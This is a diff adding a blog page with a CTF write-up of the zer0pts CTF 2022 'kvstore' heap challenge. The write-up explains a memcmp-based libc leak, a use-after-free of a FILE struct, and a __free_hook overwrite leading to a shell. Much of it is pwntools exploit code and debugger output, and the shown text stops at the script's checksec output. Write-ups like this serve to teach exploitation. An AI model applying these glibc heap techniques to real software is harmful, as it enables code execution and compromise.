@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>zer0pts CTF 2022 - kvstore | kileak</title>
+
+
+
+
+
+<meta name="description" content="zer0pts CTF 2022 - kvstore">
+
+
+<meta name="keywords" content="zer0pts, kvstore">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2022/zer0pts-kvstore/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">zer0pts CTF 2022 - kvstore</h1>
+      <p class="post-meta">Mar 20, 2022</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>zer0pts CTF 2022 - kvstore
+<!--break--></p>
+
+  <p>Do you want a heap exploitation challenge? This is the one.</p>
+
+  <p>nc pwn1.ctf.zer0pts.com 9005</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/zer0pts22/kvstore/kvstore.tar.gz">kvstore.tar.gz</a> <a href="https://kileak.github.io/assets/zer0pts22/kvstore/xpl.py">xpl.py</a></p>
+
+  <p>Team: Super HexaGoN</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">1. add
+2. get
+3. del
+4. save
+x. exit
+&gt; </code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">kvstore</code> looked like your usual heap challenge on the first glance, providing a linked list of <code class="language-plaintext highlighter-rouge">Items</code></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_Item</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">key</span><span class="p">;</span>
+  <span class="kt">double</span> <span class="n">value</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">_Item</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">Item</span><span class="p">;</span></code></pre></figure>
+
+<p>But when skimming through the code, no obvious bug in the <code class="language-plaintext highlighter-rouge">Item</code> implementation was seen. It created, freed the notes in a safe way. The only thing that stand out, was the <code class="language-plaintext highlighter-rouge">item_lookup</code></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cm">/* Find item by key */</span>
+<span class="kt">size_t</span> <span class="n">key_len</span> <span class="o">=</span> <span class="n">readline</span><span class="p">(</span><span class="s">"Key: "</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>
+<span class="n">Item</span> <span class="o">*</span><span class="n">item</span> <span class="o">=</span> <span class="n">item_lookup</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">key_len</span><span class="p">);</span>
+<span class="p">...</span>
+<span class="n">Item</span> <span class="o">*</span><span class="nf">item_lookup</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">keylen</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">Item</span> <span class="o">*</span><span class="n">cur</span> <span class="o">=</span> <span class="n">top</span><span class="p">;</span> <span class="n">cur</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">cur</span> <span class="o">=</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">,</span> <span class="n">keylen</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+      <span class="k">return</span> <span class="n">cur</span><span class="p">;</span> <span class="cm">/* Found item */</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span> <span class="cm">/* Item not found */</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Since it uses <code class="language-plaintext highlighter-rouge">memcmp</code> and we control <code class="language-plaintext highlighter-rouge">key</code> and <code class="language-plaintext highlighter-rouge">keylen</code>, this can be used to leak values behind the <code class="language-plaintext highlighter-rouge">key</code> by bruteforcing them byte by byte. So, let’s start with that to get leaks out of our way.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+  <span class="n">add</span><span class="p">(</span><span class="s">"X"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x500</span><span class="o">-</span><span class="mi">8</span><span class="p">),</span> <span class="mi">1</span><span class="p">)</span>     
+  <span class="n">free</span><span class="p">(</span><span class="s">"X"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x500</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span>         
+
+  <span class="n">add</span><span class="p">(</span><span class="s">"C"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x80</span><span class="o">-</span><span class="mi">8</span><span class="p">),</span> <span class="mi">1</span><span class="p">)</span>      <span class="c1"># creates chunk in freed bigger chunk</span></code></pre></figure>
+
+<p>Here, we’re just preparing the key chunks in such a way, that some libc main arena pointers will be available behind a key.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x555555559470:	0x00007ffff7fbff60	0x0000000000000791
+0x555555559480:	0x5858585858585858	0x5858585858585858    &lt;= big key chunk
+0x555555559490:	0x5858585858585858	0x5858585858585858
+0x5555555594a0:	0x5858585858585858	0x5858585858585858
+0x5555555594b0:	0x5858585858585858	0x5858585858585858
+0x5555555594c0:	0x5858585858585858	0x5858585858585858
+0x5555555594d0:	0x5858585858585858	0x5858585858585858
+...
+
+after free
+
+0x555555559470:	0x00007ffff7fbff60	0x0000000000000791
+0x555555559480:	0x00007ffff7fc3be0	0x00007ffff7fc3be0    &lt;= freed key chunk
+0x555555559490:	0x0000000000000000	0x0000000000000000
+0x5555555594a0:	0x5858585858585858	0x5858585858585858
+0x5555555594b0:	0x5858585858585858	0x5858585858585858
+0x5555555594c0:	0x5858585858585858	0x5858585858585858
+0x5555555594d0:	0x5858585858585858	0x5858585858585858
+0x5555555594e0:	0x5858585858585858	0x5858585858585858
+
+after allocating smaller chunk
+
+0x555555559470:	0x00007ffff7fbff60	0x0000000000000101
+0x555555559480:	0x4343434343434343	0x4343434343434343    &lt;= smaller key chunk
+0x555555559490:	0x4343434343434343	0x4343434343434343
+0x5555555594a0:	0x4343434343434343	0x4343434343434343
+0x5555555594b0:	0x4343434343434343	0x4343434343434343
+0x5555555594c0:	0x4343434343434343	0x4343434343434343
+0x5555555594d0:	0x4343434343434343	0x4343434343434343
+0x5555555594e0:	0x4343434343434343	0x4343434343434343
+0x5555555594f0:	0x4343434343434343	0x0000000000000000
+0x555555559500:	0x00007ffff7fc3be0	0x00007ffff7fc3be0    &lt;= main arena ptrs
+0x555555559510:	0x0000000000000000	0x0000000000000000
+0x555555559520:	0x5858585858585858	0x5858585858585858
+0x555555559530:	0x5858585858585858	0x5858585858585858
+0x555555559540:	0x5858585858585858	0x5858585858585858
+0x555555559550:	0x5858585858585858	0x5858585858585858
+0x555555559560:	0x5858585858585858	0x5858585858585858
+0x555555559570:	0x5858585858585858	0x0000000000000691</code></pre></figure>
+
+<p>Now, we can just brute force the libc address byte per byte by trying to access the corresponding item and check, if it’s accessable or not.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">testval</span><span class="p">(</span><span class="n">k</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span>
+  <span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+  <span class="k">return</span> <span class="ow">not</span> <span class="p">(</span><span class="s">"Item not found"</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">brute_addr</span><span class="p">():</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="s">""</span>
+
+  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
+      <span class="k">if</span> <span class="n">ch</span> <span class="o">==</span> <span class="mh">0xa</span><span class="p">:</span>
+        <span class="k">continue</span>
+
+      <span class="n">test</span> <span class="o">=</span> <span class="s">"C"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x80</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+      <span class="n">test</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+      <span class="n">test</span> <span class="o">+=</span> <span class="n">result</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span>
+
+      <span class="n">resp</span> <span class="o">=</span> <span class="n">testval</span><span class="p">(</span><span class="n">test</span><span class="p">)</span>
+
+      <span class="k">if</span> <span class="n">resp</span><span class="p">:</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Found valid byte: %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ch</span><span class="p">))</span>
+        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span>
+        <span class="k">break</span>
+
+  <span class="k">return</span> <span class="n">result</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+
+<span class="p">...</span>
+<span class="n">LIBCLEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">brute_addr</span><span class="p">())</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">LIBCLEAK</span> <span class="o">-</span> <span class="mi">96</span> <span class="o">-</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"__malloc_hook"</span><span class="p">]</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC leak     : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBCLEAK</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC          : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] Found valid byte: 0xe0
+[*] Found valid byte: 0x3b
+[*] Found valid byte: 0xfc
+[*] Found valid byte: 0xf7
+[*] Found valid byte: 0xff
+[*] Found valid byte: 0x7f
+[*] LIBC leak     : 0x7ffff7fc3be0
+[*] LIBC          : 0x7ffff7dd7000</code></pre></figure>
+
+<p>Having a libc leak is a good start, but still we need to find a way to either get an arbitrary write or corrupt memory at all.</p>
+
+<p>But there was still this weird <code class="language-plaintext highlighter-rouge">save</code> functionality</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">is_saved</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"/dev/null"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)))</span> <span class="p">{</span>
+  <span class="cm">/* We use /dev/null for experimental purpose */</span>
+  <span class="n">perror</span><span class="p">(</span><span class="s">"/dev/null"</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="p">...</span>
+
+<span class="k">case</span> <span class="mi">4</span><span class="p">:</span> <span class="p">{</span> <span class="cm">/* save */</span>
+  <span class="n">item_write_all</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+  <span class="n">is_saved</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Items saved"</span><span class="p">);</span>
+  <span class="k">break</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>How should writing notes to <code class="language-plaintext highlighter-rouge">/dev/null</code> help at all and what was it meant for? But since the <code class="language-plaintext highlighter-rouge">Item</code> functionality seemed to be quite safe, some iofile exploitation might be needed, why else would this file pointer be included.</p>
+
+<p>Taking a closer look at the exit functionality made it clearer</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="nl">default:</span> <span class="p">{</span> <span class="cm">/* exit */</span>
+  <span class="kt">char</span> <span class="n">ans</span><span class="p">;</span>
+  <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">is_saved</span><span class="p">)</span> <span class="p">{</span>
+    <span class="cm">/* Ask when list is not saved */</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"The latest item list has not been saved yet."</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Would you like to discard the changes? [y/N]"</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">"%c%*c"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ans</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ans</span> <span class="o">!=</span> <span class="sc">'y'</span> <span class="o">&amp;&amp;</span> <span class="n">ans</span> <span class="o">!=</span> <span class="sc">'Y'</span><span class="p">)</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Bye (^o^)ﾉｼ"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span></code></pre></figure>
+
+<p>Trying to exit, will <code class="language-plaintext highlighter-rouge">fclose</code> the <code class="language-plaintext highlighter-rouge">fp</code> structure, before asking, if you really want to exit. Thus trying to exit but then going back into the application will result in an <code class="language-plaintext highlighter-rouge">uaf</code>, since the <code class="language-plaintext highlighter-rouge">fp</code> structure is freed.</p>
+
+<p>While this felt like the right direction, another issue occured, as the <code class="language-plaintext highlighter-rouge">fp</code> structure has a <code class="language-plaintext highlighter-rouge">0x1e0</code> size, but since the challenge used <code class="language-plaintext highlighter-rouge">getline</code> to read the key, you could only create either a <code class="language-plaintext highlighter-rouge">0x100</code> or <code class="language-plaintext highlighter-rouge">0x1f0</code> chunk for new keys. Thus <code class="language-plaintext highlighter-rouge">tcache</code> would never serve us the freed <code class="language-plaintext highlighter-rouge">fp</code> chunk to manipulate it.</p>
+
+<p>We would need to get the <code class="language-plaintext highlighter-rouge">fp</code> chunk out of <code class="language-plaintext highlighter-rouge">tcache</code> first, but for that we would need to free a chunk with size <code class="language-plaintext highlighter-rouge">0x1e0</code> at least 7 times. But since we cannot create such a chunk for ourself, the only possibility would be to free the <code class="language-plaintext highlighter-rouge">fp</code> chunk itself multiple times.</p>
+
+<p>Experimenting in that direction brought up some strange behaviour in <code class="language-plaintext highlighter-rouge">fclose</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">add</span><span class="p">(</span><span class="s">"X"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1e0</span><span class="o">-</span><span class="mi">8</span><span class="p">),</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">fake_exit</span><span class="p">()</span>                 <span class="c1"># free fp
+</span><span class="n">add</span><span class="p">(</span><span class="s">"X"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1000</span><span class="o">-</span><span class="mi">8</span><span class="p">),</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">save</span><span class="p">()</span>
+
+<span class="n">add</span><span class="p">(</span><span class="s">"X"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1e0</span><span class="o">-</span><span class="mi">8</span><span class="p">),</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">fake_exit</span><span class="p">()</span>                 <span class="c1"># free fp
+</span><span class="n">add</span><span class="p">(</span><span class="s">"X"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1000</span><span class="o">-</span><span class="mi">8</span><span class="p">),</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">save</span><span class="p">()</span></code></pre></figure>
+
+<p>Calling <code class="language-plaintext highlighter-rouge">save</code> and thus <code class="language-plaintext highlighter-rouge">fprintf</code> on the freed <code class="language-plaintext highlighter-rouge">fp</code> seemed to avoid the double free validation when freeing it again.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x0000555555559000
+0x555555559000:	0x0000000000000000	0x0000000000000291
+0x555555559010:	0x0000000000000000	0x0000000100000000
+0x555555559020:	0x0000000000000000	0x0000000700000000
+0x555555559030:	0x0000000000000000	0x0000000000000000
+0x555555559040:	0x0000000000000000	0x0000000000000002  &lt;= freed count 2
+0x555555559050:	0x0000000000000000	0x0000000000000000
+0x555555559060:	0x0000000000000000	0x0000000000000000
+0x555555559070:	0x0000000000000000	0x0000000000000000
+0x555555559080:	0x0000000000000000	0x0000000000000000
+0x555555559090:	0x0000000000000000	0x0000000000000000
+0x5555555590a0:	0x0000000000000000	0x0000000000000000
+0x5555555590b0:	0x0000000000000000	0x0000000000000000
+0x5555555590c0:	0x0000555555559c30	0x0000000000000000
+0x5555555590d0:	0x0000000000000000	0x0000000000000000
+0x5555555590e0:	0x0000000000000000	0x0000000000000000
+0x5555555590f0:	0x0000000000000000	0x0000000000000000
+0x555555559100:	0x0000555555559cd0	0x0000000000000000
+0x555555559110:	0x0000000000000000	0x0000000000000000
+0x555555559120:	0x0000000000000000	0x0000000000000000
+0x555555559130:	0x0000000000000000	0x0000000000000000
+0x555555559140:	0x0000000000000000	0x0000000000000000
+0x555555559150:	0x0000000000000000	0x0000000000000000
+0x555555559160:	0x0000000000000000	0x0000000000000000
+0x555555559170:	0x00005555555592a0	0x0000000000000000  &lt;= freed fp struct
+0x555555559180:	0x0000000000000000	0x0000000000000000
+0x555555559190:	0x0000000000000000	0x0000000000000000
+0x5555555591a0:	0x0000000000000000	0x0000000000000000
+0x5555555591b0:	0x0000000000000000	0x0000000000000000
+0x5555555591c0:	0x0000000000000000	0x0000000000000000
+0x5555555591d0:	0x0000000000000000	0x0000000000000000
+
+gef➤  x/30gx 0x00005555555592a0
+0x5555555592a0:	0x00005555555592a0	0x0000555555559010  &lt;= fp struct (pointing to itself)
+0x5555555592b0:	0x000055555555bdd0	0x000055555555bdd0
+0x5555555592c0:	0x000055555555bdd0	0x000055555555bdd0
+0x5555555592d0:	0x000055555555ddd0	0x0000000000000000
+0x5555555592e0:	0x0000000000000000	0x0000000000000000
+0x5555555592f0:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>By doing this repeatedly, we’ll free the fp struct over and over again pushing it out of tcache into a normal freed bin.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+  <span class="n">add</span><span class="p">(</span><span class="s">"X"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1e0</span><span class="o">-</span><span class="mi">8</span><span class="p">),</span> <span class="mi">1</span><span class="p">)</span>
+  <span class="n">fake_exit</span><span class="p">()</span>                 <span class="c1"># free fp (tcache handled)
+</span>  <span class="n">add</span><span class="p">(</span><span class="s">"X"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1000</span><span class="o">-</span><span class="mi">8</span><span class="p">),</span> <span class="mi">1</span><span class="p">)</span>
+  <span class="n">save</span><span class="p">()</span>
+
+<span class="n">add</span><span class="p">(</span><span class="s">"X"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1e0</span><span class="o">-</span><span class="mi">8</span><span class="p">),</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">fake_exit</span><span class="p">()</span>                 <span class="c1"># free fp (now normal bin)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  p main_arena
+$1 = {
+  mutex = 0x0,
+  flags = 0x0,
+  have_fastchunks = 0x0,
+  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
+  top = 0x55555555dfc0,
+  last_remainder = 0x55555555caa0,
+  bins = {0x555555559290, 0x55555555caa0, 0x7ffff7fb7bf0 &lt;main_arena+112&gt;, 0x7ffff7fb7bf0 &lt;main_arena+112&gt;</code></pre></figure>
+
+<p>So, now it’s possible to split the freed <code class="language-plaintext highlighter-rouge">fp</code> struct freed chunk by just adding a key with a length smaller than <code class="language-plaintext highlighter-rouge">0x100</code>, which will then be put into the freed chunk enabling us to overwrite the <code class="language-plaintext highlighter-rouge">fp</code> struct.</p>
+
+<p>We can use that to overwrite <code class="language-plaintext highlighter-rouge">_IO_buf_base</code> and <code class="language-plaintext highlighter-rouge">_IO_buf_end</code>, which will be used in the next <code class="language-plaintext highlighter-rouge">save</code> to determine the buffer, which the <code class="language-plaintext highlighter-rouge">fp</code> structs uses to buffer the data to write. By aligning those addresses around <code class="language-plaintext highlighter-rouge">__free_hook</code>, we can use that to overwrite it.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                                         <span class="c1"># flags      / read_ptr
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                                        <span class="c1"># read_end   / read_base
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                                        <span class="c1"># write_base / write_ptr
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"__free_hook"</span><span class="p">]</span><span class="o">-</span><span class="mh">0x80</span><span class="o">-</span><span class="mh">0x150</span><span class="p">)</span>   <span class="c1"># write_end  / buf_base
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"__free_hook"</span><span class="p">]</span><span class="o">+</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>          <span class="c1"># buf_end    / save_base
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x1000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">add</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>                 <span class="c1"># overwrite fp struct
+</span><span class="n">save</span><span class="p">()</span>                          <span class="c1"># overwrite free_hook</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/gx 0x7ffff7fc5e48
+0x7ffff7fc5e48:	0x0000585858585858</code></pre></figure>
+
+<p>Looks good, so all there’s left, is to put <code class="language-plaintext highlighter-rouge">system</code> in our key at a position, so that it will land in <code class="language-plaintext highlighter-rouge">__free_hook</code> (instead of those <code class="language-plaintext highlighter-rouge">X</code>s) and free a key containing <code class="language-plaintext highlighter-rouge">/bin/sh</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x1d0</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+  <span class="n">add</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+  <span class="n">fake_exit</span><span class="p">()</span>                 <span class="c1"># free fp (tcache handled)
+</span>  <span class="n">add</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1000</span><span class="o">-</span><span class="mi">8</span><span class="p">),</span> <span class="mi">1</span><span class="p">)</span>
+  <span class="n">save</span><span class="p">()</span>
+
+<span class="p">...</span>
+
+<span class="n">add</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+
+<span class="c1"># delete key /bin/sh
+</span><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Key: "</span><span class="p">,</span> <span class="s">"/bin/sh"</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[*] '/media/sf_ctf/zero/kvstore/kvstore/libc-2.31.so'
+	Arch:     amd64-64-little
+	RELRO:    Partial RELRO
+	Stack:    Canary found
+	NX:       NX enabled
+	PIE:      PIE enabled
